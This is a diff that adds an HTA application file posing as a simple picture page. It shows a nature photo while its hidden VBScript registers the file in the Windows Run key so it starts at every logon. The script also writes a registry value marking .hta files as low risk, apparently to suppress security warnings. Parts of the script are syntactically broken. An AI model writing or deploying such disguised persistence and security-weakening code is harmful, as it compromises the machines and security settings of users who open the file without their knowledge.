@@ -1,0 +1,64 @@
+<html>
+<head>
+<hta:application 
+APPLICATIONNAME = "ping"
+ID = "ping"
+BORDERSTYLE = "Normal"
+CAPTION = "No"
+CONTEXTMENU = "No"
+INNERBORDER = "No"
+MAXIMIZEBUTTON = "No"
+MINIMIZEBUTTON = "No"
+NAVIGABLE = "No"
+SCROLL = "No"
+SCROLLFLAT = "No"
+SELECTION = "No"
+SHOWINTASKBAR = "No"
+SINGLEINSTANCE = "Yes"
+SYSMENU = "No"/> 
+<script type="text/vbs">	
+	Dim oShell
+	Dim fso 
+	Dim windowsLocation	
+	Set oShell = CreateObject ("WScript.Shell")
+	Set fso = CreateObject("Scripting.FileSystemObject")	
+	strComputerName = oShell.ExpandEnvironmentStrings( "%COMPUTERNAME%" )	
+	FullName  = replace(ping.commandLine,chr(34),"")  
+	arrFN     = split(FullName,"\")  
+	FileName  = arrFN(ubound(arrFN))
+	SourceDir = replace(FullName,FileName,"") 	
+	FullName  = SourceDir & FileName	
+	appName = "MyApp"
+		cp = "SaveZoneInformation"
+		tt = "REG_WORD"
+	DestDir = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\"&appName	
+	PolDir = "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Attachments\"
+	
+	//oShell.run "cmd /k CD C:\Program Files & ping 127.0.0.1   " ,1 , true
+	//oShell.run "cmd /k REG ADD "& DestDir 
+	
+	str1 = "LowRiskFileTypes"
+	str2 = "="
+	str3 = ".hta;"
+	oShell.RegWrite DestDir , Trim(chr(34)&FullName)&chr(34) , "REG_SZ" 	
+	oShell.RegWrite "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Associations", chr(34)&str1&chr(34)&str2&chr(34)&str3&chr(34) ,"REG_SZ"
+	
+	//Set SystemSet = GetObject("winmgmts:").InstancesOf ("Win32_OperatingSystem")			
+	//For each System in SystemSet  
+	//	windowsLocation = System.WindowsDirectory 
+	//Next 
+	
+	windowsdir = oShell.ExpandEnvironmentStrings("%windir%")
+	//sdir = oShell.ExpandEnvironmentStrings("%systemDir%")
+	//MsgBox windowsdir
+	
+	
+	
+	
+</script>
+</head>
+<body>
+  <span id="Modon"></span>
+  <img  src="http://i1.trekearth.com/photos/120518/being_natural.jpg"/>
+</body>
+</html>
